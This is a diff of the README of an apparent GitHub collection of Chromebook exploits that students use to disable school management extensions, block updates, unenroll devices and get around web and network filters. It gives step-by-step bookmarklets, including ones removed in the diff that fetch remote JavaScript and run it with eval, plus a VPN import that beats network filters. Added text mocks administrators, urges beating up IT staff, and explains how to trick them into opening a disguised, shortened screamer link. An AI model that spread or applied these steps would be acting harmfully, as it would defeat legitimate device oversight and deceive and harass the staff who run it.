@@ -5,12 +5,21 @@ If you need help ask it <a href="https://github.com/3kh0/ext-remover/discussions
 
 Please use these only when you have permission, I (3kh0) do not condone the use of any exploits for illegal purposes!
   
-**ATTENTION ALL SYS ADMINS!!!**
+**ATTENTION ALL SYS ADMINS (aka communists)!!!**
 
-go away pls
+Quit your job now. If you patch any of these we will sue but theres too much to block before you get complaints about the chromebook being unusable. Have fun. 
+
 
 <img width="250px" src="https://user-images.githubusercontent.com/58097612/191354621-bf7ff072-b9d7-46b5-994a-4d2adbf0e4f3.png">  
 Image Credit: LittleMissNyan
+
+### Thank you to all of the contributors!
+
+Yall really are pretty epic :D
+
+<a href="https://github.com/3kh0/ext-remover/graphs/contributors">
+  <img src="https://contrib.rocks/image?repo=3kh0/ext-remover" />
+</a>
 
 <details>
 <summary><b>LTMEAT</b> Disable extensions</summary>
@@ -85,7 +94,7 @@ Works by using 80-150 tabs to soak up memory.**
 
 1. Create a bookmark with the link chrome://extensions/?id=idhereidkimaskid and name it “Kill switch”.
 
-2. Create a new bookmark folder. Name it “spam.js”. Next, paste this link into your browser: chrome-extension://idhereidkimaskid/background.js
+2. Create a new bookmark folder. Name it “spam.js”. Next, paste this link into your browser: chrome-extension://insertextidhere/background.js
 
 3. Then right-click on your folder and hit “Add Page”. Press Enter.
 
@@ -332,14 +341,14 @@ This exploit keeps your Chromebook downgraded (or on the current version) withou
 11. Import the newly-downloaded file.
 
 **Extra notes**
-- Your Chromebook will no longer automatically update. (as long as you are on a wifi that you used CAUB on)
+- Your Chromebook will no longer automatically update. (as long as you are on a wifi that you CAUBed)
 - Be careful not to stay on wifi for too long without using CAUB on it, otherwise, you might update.
 - We cannot guarantee that this will work on every wifi
 
 </details>
 
 <details>
-<summary><b>Alt CAUB</b> Prevent Updates</summary>
+<summary><b>CAUB via Flags</b> Prevent Updates</summary>
 
 This alt exploit keeps your Chromebook downgraded (or on the current version) without automatic updates screwing you over. This exploit was found by <a href="https://github.com/MechaXYZ">MechaXYZ</a>. Using a Chrome flag, you can convince your Chromebook not to automatically update.
 
@@ -357,85 +366,9 @@ This alt exploit keeps your Chromebook downgraded (or on the current version) wi
 </details>
 
 <details>
-<summary><b>LTBEEF</b> Disable extensions</summary>
-
-LTBEEF is an exploit, created by Bypassi#7037, which abuses API endpoints within the Google Chrome web store. The original site created for this exploit can be found at <a href="https://ltbeef.netlify.app/">ltbeef.netlify.app</a>
-
-<b>Please Note:</b> This exploit only works on versions below 106, and earlier versions of 102
-  
-**Installation**  
-There are several versions of this exploit you can use, here are the 2 most common versions:
-- *Bookmarklets*  
-    1. To use a GUI, bookmark one of the below scripts:  
-    - Ingot  
-    ```js
-    javascript:(function () {var a = document.createElement('script');a.src = 'https://cdn.jsdelivr.net/gh/FogNetwork/Ingot/ingot.min.js';document.body.appendChild(a);}())
-    ```
-    - Compact Cow's UI  
-    ```js
-    javascript:fetch(`https://compactcow.com/ltbeef/exploit.js`).then(data=>{data.text().then(text=>{eval(text)})});
-    ```  
-    - Compact Cow's UI (Dark)
-    ```js
-    javascript:void fetch(`https://raw.githubusercontent.com/3kh0/ext-remover/main/exploit.js`).then(d=>d.text()).then(eval);
-    ```
-    2. Navigate to <a href="https://chrome.google.com/webstorex">https://chrome.google.com/webstorex</a> and click on that bookmark. 
-    3. Flip the switches on the extensions you want to disable. Simple!  
-
-    Photos of the GUI's:
-    ![image](https://user-images.githubusercontent.com/58097612/193318485-5267cd59-fb65-45a5-ad28-7f068bbce974.png)
-    ![image](https://user-images.githubusercontent.com/58097612/190276894-fc492c5c-b0ce-4943-ae56-603f75634618.png)
-   
-- *DNS servers*  
-    By changing your DNS server, you can use LTBEEF, even if bookmarklets are blocked.  
-      
-    1. First, go to Settings > Network > Wifi > Network.
-    2. Click on `Custom Name Servers`
-    
-    ![image](https://user-images.githubusercontent.com/88395302/212482302-82334f42-c421-45c2-b210-1e700652b5be.png)  
-    
-    3. Set every box there to the following ip:
-    ```
-    158.101.114.159
-    ```
-    (Hosted by The Greatest Giant#0110)  
-    4. Navigate to <a href="https://chrome.google.com/webstorex">https://chrome.google.com/webstorex</a> and click on that bookmark. 
-    5. Flip the switches on the extension you want to disable.
-    6. Profit
-    
-</details>  
-
-<details>
-<summary><b>LTBEEF inspect</b> Using inspect to disable extensions</summary>
-
-![image](https://user-images.githubusercontent.com/58097612/207386423-e6aa2095-d92d-44a8-a3d6-e42066bdf34e.png)
-
-The screenshot below was performed on `108.0.5359.75` (Official Build) (64-bit) on the stable channel. This has been tested and does work but has varying levels of success, you will need access to inspect elements, more specifically, console.
-
-1. Open this on your Chromebook: 
-```
-chrome-extension://gndmhdcefbhlchkhipcnnbkcmicncehk/manifest.json
-``` 
-Shortened link: https://tinyurl.com/i-ltbeef
-2. Open inspect and navigate to the console tab.
-3. Run the basic LTBEEF code such as
-```js
-chrome.management.setEnabled('extensionid', false)
-```
-Replacing `extensionid` with the ID of the extension you want to disable, e.g. the stuff after the = in the URL bar when you click the extension's "details" button in chrome://extensions
-
-Credit to SprinkzMC#8421 (aka Bypassi) for finding this!
-
-![image](https://user-images.githubusercontent.com/58097612/207385046-5a9f6f07-6089-4775-9183-c11bd24ba02c.png)
-
-To re-enable just go to the Chrome web listing for the extension and click on the banner.
-
-</details>
-
-<details>
 <summary><b>Blank3r</b> Reload extensions continuously</summary>
 
-Point Blank is an exploit that allows you to run bookmarklets on privileged pages, such as the Chrome extensions page. This exploit was made with Point Blank as well.
+Blank3r is an exploit that allows you to run bookmarklets on privileged pages, such as the Chrome extensions page. This exploit was made with Point Blank as well.
 
 The exploit code is below.
 1. Bookmark this code:
@@ -504,9 +437,9 @@ If you do not have these, you **CAN NOT** perform the exploit!
 </details>
 
 <details>
-<summary><b>E-Halcyon</b> Unenrolmlent Or Downgrade</summary>
+<summary><b>E-Halcyon</b> Unenrollment Or Downgrade</summary>
 
-First of all, you'll need a Linux PC or VM. WSL is not guaranteed to work
+First of all, you'll need a Linux PC or VM. WSL is not guaranteed to work.
 
 Now, you'll need to boot into SH1MMER, and press the Un-Enroll option. It won't truly unenroll you if you've received the 112 updates patching unenrollment and downgrading, but it is still a necessary step for the rest of this. If you've never used SH1MMER before or don't have an image lying around, make sure to follow all the instructions on sh1mmer.me for unenrollment before proceeding with the rest of the tutorial here
 
@@ -552,11 +485,11 @@ vk6 - Created this website
 </details>
 
 <details>
-<summary><b>Extention Inactivity hack</b> Inactive Extensions</summary>
+<summary><b>Extension Inactivity hack</b> Inactive Extensions</summary>
 
 1. First, do the Esc+Refresh+Power
-2. Ctrl+d then enter
-3. Will give you some bullcrap about dev mode being blocked press enter then you will go to a newly restarted Chromebook
+2. Press ctrl+d, then enter
+3. Will give you some bullcrap about dev mode being blocked press enter then you will go to a newly powerwashed Chromebook
 4. Next, add wifi
 5. Then sign into your account
 6. Immediately turn wifi off before extensions load
@@ -579,33 +512,37 @@ Note: Before you do any of this do it at home so that way you don't have to worr
 
 **Might Be Patched on 115 And Above**
   
-1 go to the chrome-extension://Paste the blocker id here/manifest.json page.
+1. go to the chrome-extension://blockeridhere/manifest.json page.
 
-2 go to a new tab page and type in the URL Website you want to unblock don´t go into that website yet just leave it inside the URL Box.
+2. go to a new tab page and type in the URL Website you want to unblock. don´t go into that website yet just leave it inside the URL Box.
 
-3 go back to chrome-extension://Paste the blocker id here/manifest.json now create a bookmark called E now click more and In the URL Box you put chrome://kill now save that bookmark.
+3. go back to chrome-extension://blockeridhere/manifest.json now create a bookmark called E. now click more and In the URL Box you put chrome://kill. now save that bookmark.
 
-4 create another bookmark called D click more In the URL Box copy and paste  javascript:(function () {window.onbeforeunload = function() { return 1; };})()    Into that URL Box and save that bookmark.
+4. create another bookmark called D. click more In the URL Box copy and paste
+   ```
+   javascript:(function () {window.onbeforeunload = function() { return 1; };})()
+   ```
+  Into that URL Box and save that bookmark.
 
-5 go back to chrome-extension://Paste the blocker id here/manifest.json page and now click bookmark B then quickly go back to the new tab page and click enter now quickly spam bookmark D like 2 or more times now there should be a pop up called do you want to close this page click cancel now boom that website is unblocked until you turn off your chromebook or until you exit out of that website then if that happen´s your gonna have to do all the steps again.
+6. go back to chrome-extension://blockeridhere/manifest.json page and now click bookmark B. then quickly go back to the new tab page and click enter. now quickly spam bookmark D like 2 or more times now there should be a pop up called "do you want to close this page?" click cancel. now boom that website is unblocked until you turn off your chromebook or until you exit out of that website. then if that happen´s your gonna have to do all the steps again.
 
-  Easier way for step 2: instead of putting the URL in the new tab box go to chrome-extension://Paste the blocker id here/manifest.json page then click Bookmark E then go to a random website then use the javascript:open('https://YOUR WEBSITE HERE?'+'i'.repeat(1)) Bookmarklet then spam Bookmark D two or more times then a pop up should appear quickly click cancel now boom all done.    Name of Bookmarklet > Unblock Website: javascript:open('https://YOUR WEBSITE HERE?'+'i'.repeat(1))
+  Easier way for step 2: instead of putting the URL in the new tab box go to chrome-extension://blockeridhere/manifest.json page. then click Bookmark E then go to a random website. then use the javascript:open('https://YOUR WEBSITE HERE?'+'i'.repeat(1)) Bookmarklet. then spam Bookmark D two or more times then a pop up should appear. quickly click cancel now boom all done.    Name of Bookmarklet > Unblock Website: javascript:open('https://YOUR WEBSITE HERE?'+'i'.repeat(1))
 
-Note: Save chrome-extension://Paste the blocker id here/manifest.json as a bookmark so you don´t have to come back here and type in the URL thing.
+Note: Save chrome-extension://blockeridhere/manifest.json as a bookmark so you don´t have to come back here and type in the URL thing.
 
-IMPORTANT NOTE: if bookmarklets are blocked your screwed
+IMPORTANT NOTE: if bookmarklets are blocked your screwed, womp womp
 
 </details>
 
 <details>
 <summary><b>Old TUA</b> Temporarily Unblock Any Website</summary>
 
-1. Make a bookmark called tab close blocker now click more on the bottom left corner now in that URL BOX put in `javascript:(function () {window.onbeforeunload = function() { return 1; };})()`
-2. Go to a new page now go into the URL BOX on the top and put https://YOUR WEBSITE HERE do not click enter yet stay in that URL BOX.
-3. Do search+esc now which should open task Manager if search+esc doesn't work then click the three dots on the top right now and scroll down until you find more tools click that and find task Manager.
-4. Find your blocker extension and click it now on the bottom right you should see a button called End process click it now quickly click the URL BOX on the new page and click enter now quickly spam the bookmark tab close blocker now a pop up should come up it should have to buttons cancel and leave click cancel.
+1. Make a bookmark called tab close blocker. now click more on the bottom left corner. now in that URL BOX put in `javascript:(function () {window.onbeforeunload = function() { return 1; };})()`
+2. Go to a new page. now go into the URL BOX on the top and put https://YOUR WEBSITE HERE. do not click enter yet stay in that URL BOX.
+3. Do search+esc now which should open task Manager. if search+esc doesn't work then click the three dots on the top right. now and scroll down until you find more tools click that and find task Manager.
+4. Find your blocker extension and click it. now on the bottom right you should see a button called End process. click it now quickly click the URL BOX on the new page and click enter. now quickly spam the bookmark tab close blocker. now a pop up should come up it should have to buttons cancel and leave. click cancel.
 
-IMPORTANT NOTE: You can not do this exploit if bookmarklets or the task manager is blocked.
+IMPORTANT NOTE: You can not do this exploit if bookmarklets or the task manager is blocked. womp womp
 </details>
 
 <details>
@@ -624,7 +561,7 @@ B) then "ctrl"+"d" and then space or enter
 4. There should be 2-3 buttons to use as a personal device and enroll manually and try again
 5. Click use as a personal device, then add back wifi and then sign in and boom Unenrollment worked
 
-If it doesn't work then your screwed
+If it doesn't work then your screwed, womp womp
 
 </details>
 
@@ -754,6 +691,20 @@ javascript:opener.chrome.send("TurnOffSync");
 And visit `chrome://restart`.
 `
 **This was discovered by Zoroark**
+</details>
+
+<details>
+<summary><b>Shimboot</b> Linux from RMA shim</summary>
+
+Shimboot is a collection of scripts for patching a Chrome OS RMA shim to serve as a bootloader for a standard Linux distribution. It allows you to boot a full desktop Debian install on a Chromebook, without needing to unenroll it or modify the firmware.
+  
+**For more detailed information, please see the project's [README](https://github.com/ading2210/shimboot).**
+
+Further reading:
+- https://shimboot.ading.dev/
+- https://github.com/ading2210/shimboot
+
+Credit to [vk6](https://ading.dev/) for this exploit
 </details>
 
 <details>
@@ -1100,8 +1051,21 @@ If blocked then go cry in a corner
 **Devtools must not be blocked by policy to perform this exploit.**
 
 Go to <a href="https://xlak.github.io/chaos/">this link</a> and follow instructions
+</details>
 
-If blocked then go cry in a corner
+<details>  
+<summary><b>Network Bypassing</b> A bypass for any network filters.</summary>
+
+ONLY FOR NETWORK FILTERS. A network filter is something that blocks website on the actual network instead of the operating system. Thus you can't disable with exploits like LTBEEF or LTMEAT.
+
+Go to <a href="https://drive.google.com/file/d/1MGVFf8d9pww0M2bO9ogxQX1LyR1y6zc_/view">this link</a> once you have downloaded the ONC file. Goto chrome://network and press "Import ONC File". You will have know if it worked if it says: "Network imported: 1". Then click on the time, or goto settings. Find VPN, click on it and click on the "Haven VPN" it will say "Connected" and now you are free.
+
+
+If chrome://network is blocked, start bawling your eyes out and beat up your IT manager. 
 </details>
 
 boop
+
+
+
+If you are a student who believes in privacy and freedom, heres a tutorial on how to annoy your IT manager: Send them emails to approve this website since it is required for doing a project/homework assignment: "https://stock-images.0o.si/?p#/old-man-tries-to-climb-ladder-falls-down-and-eats-cookie-2298498123". It is recommended to shorten the link with bit.ly, ad.fly, or gg.gg or any other shortner as they might get suspicious looking at the URL. Once they click on the website and press the popup they will be met with an obxniously loud sound (aka a screamer).
